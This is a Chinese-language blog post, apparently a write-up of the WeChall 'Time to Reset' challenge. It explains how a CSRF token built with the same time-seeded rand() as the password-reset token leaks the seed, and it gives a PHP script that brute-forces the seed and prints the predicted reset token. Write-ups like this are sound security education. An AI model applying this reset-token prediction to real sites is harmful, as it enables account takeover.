---
title: Time to Reset
author: rk700
layout: post
redirect_from: /writeup/2014/06/18/time-to-reset
tags:
  - PHP
  - wechall
---
[http://www.wechall.net/challenge/time\_to\_reset/index.php][1]  
最初的想法还是和注入有关，试了几次发现邮件地址不能包含特殊字符……

再从头开始看代码，发现了不自然的地方：  
提交email的表格里有CSRF的token，感觉似乎在见过的题目里并不常见；其实这也还说得过去，但是token的生成方式太可疑了，用的是和reset token同样的函数；更可疑的是，CSRF token只是生成了，并没有任何对其的检查来防范CSRF。所以这个是用来让我们暴力srand的seed的

首先生成32位的CSRF token，然后是16位的rest token。于是我们可以暴力破解，而`time()`的值可以从RFI那题里得到

下面是用来破解的代码, `ttr_random`函数就直接用题里的代码

{% highlight php %}
<?php
function ttr_random($len, $alpha='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789')
{
    $alphalen = strlen($alpha) - 1;
    $key = '';
    for($i = 0; $i < $len; $i++)
    {
        $key .= $alpha[rand(0, $alphalen)];
    }
    return $key;
}

$time=1403111639;
for($i=0; $i<255; $i++) {
    srand($time+$i);
    $csrf=ttr_random(32);
    $real='BLQChCcpFPZoACf9VpoeKEes4k2BpeDR';
    if($csrf === $real) {
        echo ttr_random(16).PHP_EOL;
    }
}
?>
{% endhighlight %}

 [1]: http://www.wechall.net/challenge/time_to_reset/index.php